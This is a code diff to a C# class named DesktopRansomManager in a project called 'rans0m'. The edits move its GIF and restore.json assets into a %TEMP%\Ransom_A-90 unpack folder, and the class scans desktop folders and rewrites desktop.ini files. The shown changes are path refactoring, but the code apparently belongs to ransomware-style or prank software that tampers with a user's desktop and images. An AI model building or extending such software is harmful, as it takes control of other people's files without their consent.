@@ -8,14 +8,14 @@ namespace rans0m
     public static class DesktopRansomManager
     {
         private static readonly object _lock = new();
-        private static readonly string ExeDir = AppContext.BaseDirectory.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
-        // All sidecar files live next to the exe, wherever it runs from -
-        // the build is a standalone single file, so nothing may assume a
-        // fixed folder. GifUri is the file:// form of GifLocalPath.
-        public static string GifLocalPath => Path.Combine(ExeDir, "Random_A-90.gif");
-        public static string GifUri => "file:///" + ExeDir.Replace('\\', '/').TrimEnd('/') + "/Random_A-90.gif";
+        // All sidecar files live in the created %TEMP%\Ransom_A-90 folder the
+        // single-file exe unpacks to (see AssetManager) - never beside the exe,
+        // never in a fixed folder. GifUri is the file:// form of GifLocalPath.
+        private static string AssetDir => AssetManager.Dir;
+        public static string GifLocalPath => Path.Combine(AssetDir, "Random_A-90.gif");
+        public static string GifUri => "file:///" + AssetDir.Replace('\\', '/').TrimEnd('/') + "/Random_A-90.gif";
         public static string GifUriLocalPath => GifLocalPath;
-        public static string JsonPath => Path.Combine(ExeDir, "restore.json");
+        public static string JsonPath => Path.Combine(AssetDir, "restore.json");
         public static string JsonAltPath => JsonPath;
 
         private static readonly string[] ImageExtensions = new[] { ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".webp", ".tiff", ".ico" };
@@ -113,7 +113,7 @@ namespace rans0m
                 if (File.Exists(GifLocalPath)) return;
                 try
                 {
-                    Directory.CreateDirectory(Path.GetDirectoryName(GifLocalPath) ?? ExeDir);
+                    Directory.CreateDirectory(Path.GetDirectoryName(GifLocalPath) ?? AssetDir);
                     Bitmap? bmp = null;
                     try { bmp = Properties.Resources.ransom_idle; } catch { }
                     if (bmp == null) try { bmp = Properties.Resources.idiot as Bitmap; } catch { }
@@ -397,8 +397,8 @@ namespace rans0m
                         try
                         {
                             var di = new DirectoryInfo(dir);
-                            // Skip if dir is our exe dir?
-                            if (dir.Equals(ExeDir, StringComparison.OrdinalIgnoreCase)) continue;
+                            // Skip our unpack folder if it ever sits on the Desktop
+                            if (dir.Equals(AssetDir, StringComparison.OrdinalIgnoreCase)) continue;
 
                             string iniPath = Path.Combine(dir, "desktop.ini");
                             bool hadIni = File.Exists(iniPath);
